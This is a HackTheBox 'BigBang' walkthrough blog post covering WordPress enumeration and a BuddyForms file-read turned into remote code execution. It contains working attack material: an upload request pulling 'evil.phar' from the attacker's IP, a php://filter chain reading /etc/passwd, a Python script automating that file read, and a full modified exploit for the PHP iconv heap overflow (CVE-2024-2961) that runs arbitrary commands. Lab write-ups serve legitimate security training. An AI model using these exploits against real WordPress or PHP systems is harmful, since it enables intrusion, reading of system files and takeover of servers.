---
layout: post
title: HTB BigBang (Machine Hard)
date: 2025-01-27
categories: [HTB, Box]
tags: [HTB, Machine, BOF, LFI, Grafana, APK]
author: Ethicxz
image: assets/image_start/bigbang.png
description: HTB Machine BigBang by Ethicxz
---
# Before Starting 
```console
Me > 10.10.14.46
Target > 10.129.226.24
```
```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 d415771e822b2ff1cc96c628c1866b3f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBET3VRLx4oR61tt3uTowkXZzNICnY44UpSL7zW4DLrn576oycUCy2Tvbu7bRvjjkUAjg4G080jxHLRJGI4NJoWQ=
|   256 6c42607bbaba67240f0cac5dbe920c66 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILbYOg6bg7lmU60H4seqYXpE3APnWEqfJwg1ojft/DPI
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.62
|_http-server-header: Apache/2.4.62 (Debian)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://blog.bigbang.htb/
Service Info: Host: blog.bigbang.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Website Enumeration
To begin, we have a website which is using Wordpress 6.5.4

![alt text](../assets/image_bigbang/1.png)

So we can do a simple wpscan on it :

```bash
wpscan --url 'http://blog.bigbang.htb'

[i] Plugin(s) Identified:

[+] buddyforms
 | Location: http://blog.bigbang.htb/wp-content/plugins/buddyforms/
 | Last Updated: 2024-09-25T04:52:00.000Z
 | [!] The version is out of date, the latest version is 2.8.13
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 2.7.7 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://blog.bigbang.htb/wp-content/plugins/buddyforms/readme.txt
```
This is interesting because BuddyForms 2.7.7 is vulnerable to an unauthenticated insecure deserialization :

## LFI with wrapwrap

[CVE-2023-26326](https://medium.com/tenable-techblog/wordpress-buddyforms-plugin-unauthenticated-insecure-deserialization-cve-2023-26326-3becb5575ed8)

But the exploit can't work because our site is using ```PHP 8.3.2``` and since ```PHP 8+``` there is no longer unserializes meta data automatically and also because Wordpress does not have any deserialisation gadget chains

[phar:// on PHP 8.+](https://php.watch/versions/8.0/phar-stream-wrapper-unserialize)

But we can try to divert the cve to an LFI.

So from the ```cve-2023-26326``` we should do this :

```console
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: blog.bigbang.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 91
Origin: http://blog.bigbang.htb
Connection: keep-alive
Referer: http://blog.bigbang.htb/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

action=upload_image_from_url&url=http://10.10.14.43/evil.phar&id=1&accepted_files=image/gif
```
![alt text](../assets/image_bigbang/evilphar.png)

![alt text](../assets/image_bigbang/burp1.png)

But if we follow the path in the response like the PoC did, it doesnt work.

So we can try LFI by using this [tool](https://github.com/ambionics/wrapwrap.git)

```Generates a php://filter chain that adds a prefix and a suffix to the contents of a file.``` 

```bash
python3 wrapwrap/wrapwrap.py /etc/passwd "GIF89a" "" 10
[!] Ignoring nb_bytes value since there is no suffix
[+] Wrote filter chain to chain.txt (size=1444).
```
```bash
curl 'http://blog.bigbang.htb/wp-admin/admin-ajax.php' -H "Content-Type: application/x-www-form-urlencoded" -d 'action=upload_image_from_url&id=1&url=php://filter/convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.base64-decode/resource=file:///etc/passwd&accepted_files=image/gif'
{"status":"OK","response":"http:\/\/blog.bigbang.htb\/wp-content\/uploads\/2025\/01\/1.png","attachment_id":155}
```
Now we can download the image and print it

```bash
wget http:\/\/blog.bigbang.htb\/wp-content\/uploads\/2025\/01\/1.png

# cat 1.png
GIF89aroot:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologi
```
But unfortunately we don't have the entire file, we only get partial files back because of the limited heap size of PHP

But we can always try to get some informations, so i wrote a python script to automate the LFI :

```python
import requests
import os

def upload_file_read(file_path):
    url = "http://blog.bigbang.htb/wp-admin/admin-ajax.php"

    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }

    payload = (
        "action=upload_image_from_url&id=1&url="
        "php://filter/convert.base64-encode|convert.iconv.855.UTF7|"
        "convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|"
        "convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|"
        "convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|"
        "convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|"
        "convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|"
        "convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|"
        "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|"
        "convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|"
        "convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSA_T500.UTF-32|"
        "convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|"
        "convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|"
        "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|"
        "convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|"
        "convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|"
        "convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|"
        "convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|"
        "convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|"
        "convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|"
        "convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|"
        "convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|"
        "convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|"
        "convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|"
        f"convert.base64-decode/resource={file_path}&accepted_files=image/gif"
    )

    print(f"[*] Target URL: {url}")
    print(f"[*] Trying to read file: {file_path}")

    response = requests.post(url, headers=headers, data=payload)

    if response.status_code == 200:
        print("[+] Request successful!")
        print("[*] Response:")
        print(response.text)

        try:
            response_data = response.json()
            image_url = response_data.get("response")
            if image_url:
                
                print(f"[*] Downloading image from: {image_url}")
                image_response = requests.get(image_url)
                if image_response.status_code == 200:
                    image_filename = image_url.split("/")[-1]
                    with open(image_filename, "wb") as img_file:
                        img_file.write(image_response.content)
                    print(f"[+] Image downloaded: {image_filename}")

                    print("[*] Displaying image content:")
                    with open(image_filename, "rb") as img_file:
                        content = img_file.read()
                        if content.startswith(b"GIF89a"):
                            decoded_content = content.decode("utf-8", errors="ignore")
                            print("\n--- BEGIN FILE CONTENT ---")
                            print("\n".join(line for line in decoded_content.splitlines()))
                            print("--- END FILE CONTENT ---\n")
                        else:
                            print("[-] The file is not a valid image or does not contain readable content.")
                else:
                    print("[-] Failed to download the image.")
            else:
                print("[-] No image URL found in the response.")
        except ValueError:
            print("[-] Failed to parse the JSON response.")
    else:
        print(f"[-] Error: {response.status_code}")
        print(response.text)

if __name__ == "__main__":
    file_to_read = input("Enter the file path to read (e.g., /etc/passwd): ")
    upload_file_read(file_to_read)
```
For example if we want to read ```/etc/hosts```

```bash
python3 exploit_lfi.py
Enter the file path to read (e.g., /etc/passwd): /etc/hosts
[*] Target URL: http://blog.bigbang.htb/wp-admin/admin-ajax.php
[*] Trying to read file: /etc/hosts
[+] Request successful!
[*] Response:
{"status":"OK","response":"http:\/\/blog.bigbang.htb\/wp-content\/uploads\/2025\/01\/1-2.png","attachment_id":157}
[*] Downloading image from: http://blog.bigbang.htb/wp-content/uploads/2025/01/1-2.png
[+] Image downloaded: 1-2.png
[*] Displaying image content:

--- BEGIN FILE CONTENT ---
GIF89a127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::0	ip6-localnet
ff00::0	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
172.17.0.3	bf9a078
--- END FILE CONTENT ---
```
But after some enumerations, i found nothing interesting to read.

## BOF lead to an RCE

After some research i found this : [CVE-2024-2961](https://github.com/ambionics/cnext-exploits/)

----- CVE-2024-2961 : Exploitation of ```iconv()``` function lead to an RCE ----- 

CVE-2024-2961 which is linked to a vulnerability in the PHP ```iconv()``` function, exploited with the ```php://``` wrapper. This bug allows you to cause a memory leak and trigger remote code execution (RCE). Exploitation of this flaw takes place in three main stages:

----- 1. Trigger Buffer Overflow ----- 

When the ```iconv()``` function converts a string, it dynamically allocates a buffer to store the converted string. If the string is malformed, this can result in either an ```Out-of-Bounds Read``` or an incorrect write to the buffer, which can corrupt the memory. By injecting exotic characters, such as ```劄 ; 䂚 ; 峛 ; 湿```, an overflow of 1 to 3 bytes is caused. These characters cause overflow in the output buffer, which alters memory management.

----- 2. Memory Manipulation ----- 

Once overflow is triggered, memory corruption allows PHP's internal structures to be altered. In our case PHP manages memory via chunks of ```fixed``` size, and an overflow can overwrite these structures, thereby affecting function pointers. This manipulation can redirect program execution, allowing execution to be pointed at a malicious function like ```system()```. This opens the way to executing arbitrary commands.

-----  3. Redirect towards `system()` and exploitation ----- 

To fully exploit this vulnerability, the attacker must use the obtained leak information, such as access to ```/proc/self/maps``` and ```libc```. This information allows you to precisely locate the addresses of the ```glibc and PHP heap```, which bypasses protections like ```PIE (Position Independent Executable)``` and ```ASLR (Address Space Layout Randomization)```. Once these addresses are known, the attacker can calculate the offsets necessary to obtain the address of ```system()```, ```malloc()```, and ```realloc()```. By sending a carefully crafted payload through the ```php://filter/..``` filter, the attacker corrupts the heap, overwrites function pointers, and executes ```system()```, thereby allowing execution of arbitrary commands and achieving remote code execution.

For a better explanation :

[Part 1](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)
[Part 2](https://www.ambionics.io/blog/iconv-cve-2024-2961-p2)
[Part 3](https://www.ambionics.io/blog/iconv-cve-2024-2961-p3)

Using the LFI we can read ```/proc/self/maps``` (like the PoC said) and we can also download the libc to see the version :

```bash
strings libc.so.6| grep -I 'version'
versionsort64
gnu_get_libc_version
argp_program_version
versionsort
__nptl_version
argp_program_version_hook
RPC: Incompatible versions of RPC
RPC: Program/version mismatch
<malloc version="1">
Print program version
GNU C Library (Debian GLIBC 2.36-9+deb12u4) stable release version 2.36.
Compiled by GNU CC version 12.2.0.
(PROGRAM ERROR) No version known!?
%s: %s; low version = %lu, high version = %lu
.gnu.version
.gnu.version_d
.gnu.version_r
```
Download the correct libc and we can use [THIS](https://github.com/ambionics/cnext-exploits/blob/main/cnext-exploit.py) PoC, we just need to modify it :

Here the full PoC modified :

## PoC 

```python
#!/usr/bin/env python3
#
# CNEXT: PHP file-read to RCE (CVE-2024-2961)
# Date: 2024-05-27
# Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)
#
# TODO Parse LIBC to know if patched
#
# INFORMATIONS
#
# To use, implement the Remote class, which tells the exploit how to send the payload.
#

from __future__ import annotations

import base64
import urllib.parse
import zlib
import urllib

from dataclasses import dataclass
from requests.exceptions import ConnectionError, ChunkedEncodingError

from pwn import *
from ten import *


HEAP_SIZE = 2 * 1024 * 1024
BUG = "劄".encode("utf-8")


class Remote:
    """A helper class to send the payload and download files.
    
    The logic of the exploit is always the same, but the exploit needs to know how to
    download files (/proc/self/maps and libc) and how to send the payload.
    
    The code here serves as an example that attacks a page that looks like:
    
    ```php
    <?php
    
    $data = file_get_contents($_POST['file']);
    echo "File contents: $data";
    ```
    
    Tweak it to fit your target, and start the exploit.
    """

    def __init__(self, url: str) -> None:
        self.url = url
        self.session = Session()

    def send(self, path: str) -> Response:
        """Sends given `path` to the HTTP server. Returns the response.
        """

        data = {'action' : 'upload_image_from_url',
                'url' : urllib.parse.quote_plus('php://filter/convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.base64-decode/resource='+path),
                'id' : '1',
                'accepted_files' : 'image/gif'}
        return self.session.post(self.url, data=data)


    def send_exploit(self, payload: bytes) -> Response:
        """Sends the payload to the server.
        """
        data = {'action' : 'upload_image_from_url',
                'url' : urllib.parse.quote_plus(payload),
                'id' : '1',
                'accepted_files' : 'image/gif'}
        return self.session.post(self.url, data=data)
        
    def download(self, path: str) -> bytes:
        """Returns the contents of a remote file.
        """
        path = f"php://filter/convert.base64-encode/resource={path}"
        file_path = self.send(path).json()['response']
        
        if 'File type' in file_path:
            print(file_path)
            return b''
        
        response = self.session.get(file_path)
        data = response.content[6:]
        return data

    def data_decode(self, data:bytes)->bytes:
        data = data.decode('latin-1')
        return base64.decode(data + (4 - len(data) % 4) * '=')

@entry
@arg("url", "Target URL")
@arg("command", "Command to run on the system; limited to 0x140 bytes")
@arg("sleep", "Time to sleep to assert that the exploit worked. By default, 1.")
@arg("heap", "Address of the main zend_mm_heap structure.")
@arg(
    "pad",
    "Number of 0x100 chunks to pad with. If the website makes a lot of heap "
    "operations with this size, increase this. Defaults to 20.",
)
@dataclass
class Exploit:
    """CNEXT exploit: RCE using a file read primitive in PHP."""

    url: str
    command: str
    sleep: int = 1
    heap: str = None
    pad: int = 20

    def __post_init__(self):
        self.remote = Remote(self.url)
        self.log = logger("EXPLOIT")
        self.info = {}
        self.heap = self.heap and int(self.heap, 16)

    def check_vulnerable(self) -> None:
        """Checks whether the target is reachable and properly allows for the various
        wrappers and filters that the exploit needs.
        """
        
        def safe_download(path: str) -> bytes:
            try:
                return self.remote.download(path)
            except ConnectionError:
                failure("Target not [b]reachable[/] ?")
            

        def check_token(text: str, path: str) -> bool:
            result = safe_download(path)

            return len(set(result).intersection(set(text.encode()))) > 0

        text = tf.random.string(50).encode()
        base64 = b64(b'GIF89a' + text, misalign=True).decode()
        path = f"data:text/plain;base64,{base64}"
        
        result = safe_download(path)
        
        if len(set(result).intersection(set(text))) == 0:
            msg_failure("Remote.download did not return the test string")
            print("--------------------")
            print(f"Expected test string: {text}")
            print(f"Got: {result}")
            print("--------------------")
            failure("If your code works fine, it means that the [i]data://[/] wrapper does not work")

        msg_info("The [i]data://[/] wrapper works")

        text = 'GIF89a' + tf.random.string(50)
        base64 = b64(text.encode(), misalign=True).decode()
        path = f"php://filter//resource=data:text/plain;base64,{base64}"
        if not check_token(text, path):
            failure("The [i]php://filter/[/] wrapper does not work")

        msg_info("The [i]php://filter/[/] wrapper works")

        text = 'GIF89a' + tf.random.string(50)
        base64 = b64(compress(text.encode()), misalign=True).decode()
        path = f"php://filter/zlib.inflate/resource=data:text/plain;base64,{base64}"

        if not check_token(text, path):
            failure("The [i]zlib[/] extension is not enabled")

        msg_info("The [i]zlib[/] extension is enabled")

        msg_success("Exploit preconditions are satisfied")

    def get_file(self, path: str) -> bytes:
        with msg_status(f"Downloading [i]{path}[/]..."):
            return self.remote.download(path)

    def get_regions(self) -> list[Region]:
        """Obtains the memory regions of the PHP process by querying /proc/self/maps."""
        maps = self.remote.data_decode(self.get_file("/proc/self/maps"))
        
        PATTERN = re.compile(
            r"^([a-f0-9]+)-([a-f0-9]+)\b" r".*" r"\s([-rwx]{3}[ps])\s" r"(.*)"
        )
        regions = []
        for region in table.split(maps, strip=True):
            if match := PATTERN.match(region):
                start = int(match.group(1), 16)
                stop = int(match.group(2), 16)
                permissions = match.group(3)
                path = match.group(4)
                if "/" in path or "[" in path:
                    path = path.rsplit(" ", 1)[-1]
                else:
                    path = ""
                current = Region(start, stop, permissions, path)
                regions.append(current)
            else:
                failure("Unable to parse memory mappings")

        self.log.info(f"Got {len(regions)} memory regions")

        return regions

    def get_symbols_and_addresses(self) -> None:
        """Obtains useful symbols and addresses from the file read primitive."""
        regions = self.get_regions()

        LIBC_FILE = "./libc.so.6"

        # PHP's heap

        self.info["heap"] = self.heap or self.find_main_heap(regions)
        print(f'HEAP address: {hex(self.info["heap"])}')

        # Libc

        libc = self._get_region(regions, "libc-", "libc.so")

        #self.download_file(libc.path, LIBC_FILE)

        self.info["libc"] = ELF(LIBC_FILE, checksec=False)
        print(f'LIBC address: {hex(libc.start)}')
        self.info["libc"].address = libc.start

    def _get_region(self, regions: list[Region], *names: str) -> Region:
        """Returns the first region whose name matches one of the given names."""
        for region in regions:
            if any(name in region.path for name in names):
                break
        else:
            failure("Unable to locate region")

        return region

    def download_file(self, remote_path: str, local_path: str) -> None:
        """Downloads `remote_path` to `local_path`"""
        data = self.remote.data_decode(self.get_file(remote_path))
        Path(local_path).write(data)

    def find_main_heap(self, regions: list[Region]) -> Region:
        # Any anonymous RW region with a size superior to the base heap size is a
        # candidate. The heap is at the bottom of the region.
        heaps = [
            region.stop - HEAP_SIZE + 0x40
            for region in reversed(regions)
            if region.permissions == "rw-p"
            and region.size >= HEAP_SIZE
            and region.stop & (HEAP_SIZE-1) == 0
            and region.path in ("", "[anon:zend_alloc]")
        ]

        if not heaps:
            failure("Unable to find PHP's main heap in memory")

        first = heaps[0]

        if len(heaps) > 1:
            heaps = ", ".join(map(hex, heaps))
            msg_info(f"Potential heaps: [i]{heaps}[/] (using last one)")
        else:
            msg_info(f"Using [i]{hex(first)}[/] as heap")

        return first

    def run(self) -> None:
        #self.check_vulnerable()
        self.get_symbols_and_addresses()
        self.exploit()

    def build_exploit_path(self) -> str:
        """On each step of the exploit, a filter will process each chunk one after the
        other. Processing generally involves making some kind of operation either
        on the chunk or in a destination chunk of the same size. Each operation is
        applied on every single chunk; you cannot make PHP apply iconv on the first 10
        chunks and leave the rest in place. That's where the difficulties come from.

        Keep in mind that we know the address of the main heap, and the libraries.
        ASLR/PIE do not matter here.

        The idea is to use the bug to make the freelist for chunks of size 0x100 point
        lower. For instance, we have the following free list:

        ... -> 0x7fffAABBCC900 -> 0x7fffAABBCCA00 -> 0x7fffAABBCCB00

        By triggering the bug from chunk ..900, we get:

        ... -> 0x7fffAABBCCA00 -> 0x7fffAABBCCB48 -> ???

        That's step 3.

        Now, in order to control the free list, and make it point whereever we want,
        we need to have previously put a pointer at address 0x7fffAABBCCB48. To do so,
        we'd have to have allocated 0x7fffAABBCCB00 and set our pointer at offset 0x48.
        That's step 2.

        Now, if we were to perform step2 an then step3 without anything else, we'd have
        a problem: after step2 has been processed, the free list goes bottom-up, like:

        0x7fffAABBCCB00 -> 0x7fffAABBCCA00 -> 0x7fffAABBCC900

        We need to go the other way around. That's why we have step 1: it just allocates
        chunks. When they get freed, they reverse the free list. Now step2 allocates in
        reverse order, and therefore after step2, chunks are in the correct order.

        Another problem comes up.

        To trigger the overflow in step3, we convert from UTF-8 to ISO-2022-CN-EXT.
        Since step2 creates chunks that contain pointers and pointers are generally not
        UTF-8, we cannot afford to have that conversion happen on the chunks of step2.
        To avoid this, we put the chunks in step2 at the very end of the chain, and
        prefix them with `0\n`. When dechunked (right before the iconv), they will
        "disappear" from the chain, preserving them from the character set conversion
        and saving us from an unwanted processing error that would stop the processing
        chain.

        After step3 we have a corrupted freelist with an arbitrary pointer into it. We
        don't know the precise layout of the heap, but we know that at the top of the
        heap resides a zend_mm_heap structure. We overwrite this structure in two ways.
        Its free_slot[] array contains a pointer to each free list. By overwriting it,
        we can make PHP allocate chunks whereever we want. In addition, its custom_heap
        field contains pointers to hook functions for emalloc, efree, and erealloc
        (similarly to malloc_hook, free_hook, etc. in the libc). We overwrite them and
        then overwrite the use_custom_heap flag to make PHP use these function pointers
        instead. We can now do our favorite CTF technique and get a call to
        system(<chunk>).
        We make sure that the "system" command kills the current process to avoid other
        system() calls with random chunk data, leading to undefined behaviour.

        The pad blocks just "pad" our allocations so that even if the heap of the
        process is in a random state, we still get contiguous, in order chunks for our
        exploit.

        Therefore, the whole process described here CANNOT crash. Everything falls
        perfectly in place, and nothing can get in the middle of our allocations.
        """

        LIBC = self.info["libc"]
        ADDR_EMALLOC = LIBC.symbols["__libc_malloc"]
        ADDR_EFREE = LIBC.symbols["__libc_system"]
        ADDR_EREALLOC = LIBC.symbols["__libc_realloc"]

        ADDR_HEAP = self.info["heap"]
        ADDR_FREE_SLOT = ADDR_HEAP + 0x20
        ADDR_CUSTOM_HEAP = ADDR_HEAP + 0x0168

        ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10

        CS = 0x100

        # Pad needs to stay at size 0x100 at every step
        pad_size = CS - 0x18
        pad = b"\x00" * pad_size
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = compressed_bucket(pad)

        step1_size = 1
        step1 = b"\x00" * step1_size
        step1 = chunked_chunk(step1)
        step1 = chunked_chunk(step1)
        step1 = chunked_chunk(step1, CS)
        step1 = compressed_bucket(step1)

        # Since these chunks contain non-UTF-8 chars, we cannot let it get converted to
        # ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk "crash"

        step2_size = 0x48
        step2 = b"\x00" * (step2_size + 8)
        step2 = chunked_chunk(step2, CS)
        step2 = chunked_chunk(step2)
        step2 = compressed_bucket(step2)

        step2_write_ptr = b"0\n".ljust(step2_size, b"\x00") + p64(ADDR_FAKE_BIN)
        step2_write_ptr = chunked_chunk(step2_write_ptr, CS)
        step2_write_ptr = chunked_chunk(step2_write_ptr)
        step2_write_ptr = compressed_bucket(step2_write_ptr)

        step3_size = CS

        step3 = b"\x00" * step3_size
        assert len(step3) == CS
        step3 = chunked_chunk(step3)
        step3 = chunked_chunk(step3)
        step3 = chunked_chunk(step3)
        step3 = compressed_bucket(step3)

        step3_overflow = b"\x00" * (step3_size - len(BUG)) + BUG
        assert len(step3_overflow) == CS
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = compressed_bucket(step3_overflow)

        step4_size = CS
        step4 = b"=00" + b"\x00" * (step4_size - 1)
        step4 = chunked_chunk(step4)
        step4 = chunked_chunk(step4)
        step4 = chunked_chunk(step4)
        step4 = compressed_bucket(step4)

        # This chunk will eventually overwrite mm_heap->free_slot
        # it is actually allocated 0x10 bytes BEFORE it, thus the two filler values
        step4_pwn = ptr_bucket(
            0x200000,
            0,
            # free_slot
            0,
            0,
            ADDR_CUSTOM_HEAP,  # 0x18
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            ADDR_HEAP,  # 0x140
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            size=CS,
        )

        step4_custom_heap = ptr_bucket(
            ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18
        )

        step4_use_custom_heap_size = 0x140

        COMMAND = self.command
        COMMAND = f"kill -9 $PPID; {COMMAND}"
        if self.sleep:
            COMMAND = f"sleep {self.sleep}; {COMMAND}"
        COMMAND = COMMAND.encode() + b"\x00"

        assert (
            len(COMMAND) <= step4_use_custom_heap_size
        ), f"Command too big ({len(COMMAND)}), it must be strictly inferior to {hex(step4_use_custom_heap_size)}"
        COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b"\x00")

        step4_use_custom_heap = COMMAND
        step4_use_custom_heap = qpe(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)

        pages = (
            step4 * 3
            + step4_pwn
            + step4_custom_heap
            + step4_use_custom_heap
            + step3_overflow
            + pad * self.pad
            + step1 * 3
            + step2_write_ptr
            + step2 * 2
        )

        resource = compress(compress(pages))
        resource = b64(resource) #b64(pages) 
        resource = f"data:text/plain;base64,{resource.decode()}"

        filters = [
            # Create buckets
            "zlib.inflate",
            "zlib.inflate",
            
            # Step 0: Setup heap
            "dechunk",
            "convert.iconv.L1.L1",
            
            # Step 1: Reverse FL order
            "dechunk",
            "convert.iconv.L1.L1",
            
            # Step 2: Put fake pointer and make FL order back to normal
            "dechunk",
            "convert.iconv.L1.L1",
            
            # Step 3: Trigger overflow
            "dechunk",
            "convert.iconv.UTF-8.ISO-2022-CN-EXT",
            
            # Step 4: Allocate at arbitrary address and change zend_mm_heap
            "convert.quoted-printable-decode",
            "convert.iconv.L1.L1",
        ]
        filters = "|".join(filters)
        path = f"php://filter/read={filters}/resource={resource}"

        return path

    @inform("Triggering...")
    def exploit(self) -> None:
        path = self.build_exploit_path()
        start = time.time()

        try:
            msg_print("Sending exploit...")
            print(f'PATH: {path}')

            self.remote.send_exploit(path)
        except (ConnectionError, ChunkedEncodingError):
            pass
        
        msg_print()
        
        if not self.sleep:
            msg_print("    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]")
        elif start + self.sleep <= time.time():
            msg_print("    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]")
        else:
            # Wrong heap, maybe? If the exploited suggested others, use them!
            msg_print("    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]")
        
